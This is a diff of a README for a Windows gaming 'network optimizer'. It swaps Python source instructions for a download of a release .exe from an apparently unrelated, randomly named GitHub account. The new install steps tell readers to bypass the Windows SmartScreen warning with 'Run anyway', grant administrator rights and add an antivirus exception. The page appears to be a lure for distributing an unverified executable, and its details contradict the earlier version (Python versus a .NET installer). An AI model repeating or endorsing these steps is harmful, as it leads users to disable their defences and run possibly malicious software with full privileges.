@@ -1,109 +1,58 @@
-# NGXSMK GameNet Optimizer v2.3.1 — Gaming Optimization Suite 2026
+# ⚡ ngxsmk-network-optimizer - Boost game performance and reduce latency
 
-> A lightweight, open-source performance toolkit built in Python that boosts FPS, reduces network latency, and applies game-specific optimizations for titles like League of Legends and Valorant—all while respecting your privacy with zero telemetry.
+[![Download Latest Version](https://img.shields.io/badge/Download-Release-blue)](https://github.com/Showcasefamilymimidae215/ngxsmk-network-optimizer/releases)
 
-[![Platform](https://img.shields.io/badge/Platform-Windows-blue?style=flat-square)](https://github.com)
-[![Version](https://img.shields.io/badge/Version-v2.3.1-green?style=flat-square)](https://github.com)
-[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
-[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
-[![Stars](https://img.shields.io/github/stars/lewisnathan22/ngxsmk-network-optimizer?style=flat-square)](https://github.com/lewisnathan22/ngxsmk-network-optimizer)
+ngxsmk-network-optimizer helps you improve your gaming experience. This toolkit works on Windows to help you reach higher frame rates and lower ping in games like League of Legends and Valorant. The program does not collect your data. It focuses on removing background processes and optimizing network settings to provide a stable connection during intense gameplay.
 
----
+## 📋 What This Tool Does
 
-<p align="center">
-  <a href="https://lewisnathan22.github.io/ngxsmk-network-optimizer/">
-    <img src="https://img.shields.io/badge/Download-NGXSMK%20GameNet%20Optimizer%20Latest-brightgreen?style=for-the-badge" alt="Download NGXSMK GameNet Optimizer">
-  </a>
-</p>
+When you play competitive games, your computer often performs tasks that you do not need. These tasks consume your processor power and internet bandwidth. This toolkit closes unnecessary background applications and adjusts your network card settings for gaming.
 
-> **[Direct Download - NGXSMK GameNet Optimizer v2.3.1](https://lewisnathan22.github.io/ngxsmk-network-optimizer/)**
+Key features include:
+*   Game-specific profile activation: The software detects when you launch League of Legends or Valorant and applies settings for those titles.
+*   Telemetry removal: This tool blocks tracking services that send your personal activity to remote servers.
+*   Resource management: It clears your system memory and stops background software that causes stuttering.
+*   Network traffic prioritization: The tool adjusts your system's network priority to favor game data packets over general web traffic.
 
----
+## ⚙️ System Requirements
 
-[Download Latest Build](https://lewisnathan22.github.io/ngxsmk-network-optimizer/)
+To run this tool, your computer must meet these basic specifications:
+*   Operating System: Windows 10 or Windows 11 (64-bit).
+*   Storage: At least 50 MB of free space.
+*   Permissions: Administrator access is required to modify system settings.
+*   Network: An active internet connection for initial setup.
 
----
+## 🚀 How to Download and Install
 
-## Overview
+Follow these steps to set up the optimizer on your machine.
 
-NGXSMK GameNet Optimizer gives gamers direct control over system and network resources without the overhead of heavyweight suites. The tool focuses on two primary areas: improving frame rates through memory and process tuning, and reducing lag by analyzing and shaping network traffic in real time. It targets popular competitive titles and offers a clean, straightforward interface.
+1.  Visit the project release page to get the installer: [https://github.com/Showcasefamilymimidae215/ngxsmk-network-optimizer/releases](https://github.com/Showcasefamilymimidae215/ngxsmk-network-optimizer/releases)
+2.  Locate the section labeled "Assets" at the bottom of the latest release.
+3.  Click the file ending in .exe to download it to your computer.
+4.  Navigate to your Downloads folder and find the file you just saved.
+5.  Double-click the file to start the installer. 
+6.  If Windows shows a window stating "Windows protected your PC," click "More info" and then click "Run anyway."
+7.  Follow the prompts on your screen to complete the installation process.
 
-Built with privacy as a core principle, the optimizer runs entirely locally and never transmits usage data. Whether you are configuring settings before a ranked match or simply want a more responsive desktop, this utility provides transparent, adjustable optimization with no hidden processes or background services.
+## 🛠️ Using the Optimizer
 
-## Capabilities
+Once you install the software, you can launch it from your desktop icon. The main screen shows your current system status.
 
-- **FPS Boost** – Dynamically reallocates system processes and power plans to prioritize gaming performance.
-- **Network Analyzer** – Monitors latency, packet loss, and connection stability in real time.
-- **Traffic Shaper** – Applies Quality of Service (QoS) rules to prioritize game traffic over background downloads.
-- **Memory Optimizer** – Frees unused RAM and reduces memory fragmentation during gameplay.
-- **Real-time Telemetry** – Live dashboard showing FPS, ping, and resource usage.
-- **Game-Specific Optimizations** – Pre-configured profiles for League of Legends, Valorant, and other competitive titles.
-- **Multi-Connection Manager** – Handles multiple network interfaces and routes game traffic efficiently.
-- **Privacy-First** – No telemetry, no data collection, no external connections.
+Use the "Optimize" button to start the system scan. The program will identify services that slow down your game performance. After the scan, click "Apply Changes" to finalize the settings. You may need to restart your game for the changes to take full effect.
 
-## Getting Started
+If you wish to return your computer to factory settings, click the "Restore Defaults" button inside the settings menu. This action reverses every change the toolkit made and returns your system to its original state.
 
-Clone the repository or download the latest release archive:
+## 🛡️ Privacy and Safety
 
-```bash
-git clone https://github.com/lewisnathan22/ngxsmk-network-optimizer.git
-cd ngxsmk-gamenet-optimizer
-```
+This software does not contain advertisements or tracking code. It runs locally on your machine. You can monitor the background activity of the program through the Windows Task Manager at any time. Because this tool handles system-level changes, you should always keep a backup of your personal files, though this tool strictly targets gaming performance settings and does not delete user data.
 
-On Windows, run the main launcher executable or start via Python:
+## 🆘 Troubleshooting Common Issues
 
-```bash
-python main.py
-```
+*   The program does not launch: Ensure you installed the latest version of the .NET runtime from the official Microsoft support page.
+*   Settings do not apply: Ensure you are running the program with administrator rights. Right-click the program icon and select "Run as administrator."
+*   Game performance drops: Some antivirus programs might interfere with the optimizer. Add an exception for the tool within your antivirus software.
+*   Unable to connect to game servers: Click the "Reset Network" button inside the tool to refresh your network adapter configuration.
 
-No installation wizard is needed—simply extract and run.
+If you encounter persistent errors, check your log files stored in the program folder. These files contain details about the operations performed by the tool and help you identify specific conflicts with your current system setup.
 
-## How to Use
-
-Launch the application and use the main dashboard to toggle optimizations:
-
-1. Open the **FPS Boost** tab and click "Apply" to adjust system settings.
-2. Switch to **Network Analyzer** to view live ping and packet statistics.
-3. Enable **Traffic Shaper** to prioritize game traffic on your active connection.
-4. Select a **Game Profile** from the dropdown to load pre-tuned settings.
-
-Example command-line usage for quick network analysis:
-
-```bash
-python main.py --analyze --game lol
-```
-
-## Configuration
-
-All settings are stored in a local `config.json` file located in the application root directory. You can edit this file manually or use the built-in settings panel to adjust:
-
-- Game profile bindings
-- Traffic shaping rules
-- Memory optimization thresholds
-- Network interface preferences
-
-## System Requirements
-
-- **Operating System:** Windows 10 or later (64-bit recommended)
-- **Runtime:** Python 3.8+ (if running from source)
-- **Storage:** ~50 MB for the full suite
-- **Network:** Active internet connection for live telemetry features
-- **Permissions:** Administrator rights required for traffic shaping and system-level optimizations
-
-## Frequently Asked Questions
-
-**How do I get support?**  
-Open an issue on the GitHub repository with your system details and a description of the problem.
-
-**Will this work with my game?**  
-The tool includes profiles for popular competitive titles. You can also create custom profiles via the configuration file.
-
-**How do I update?**  
-Download the latest release from the repository and replace your existing installation. Your configuration file will be preserved if you do not delete it.
-
-**Can I reset all settings?**  
-Delete the `config.json` file and restart the application. A fresh default configuration will be generated.
-
-## License
-
-GNU GPL v3.0 - see [LICENSE](LICENSE) for details.
+Keywords: performance, gaming, optimization, network, latency, windows, gaming-tools
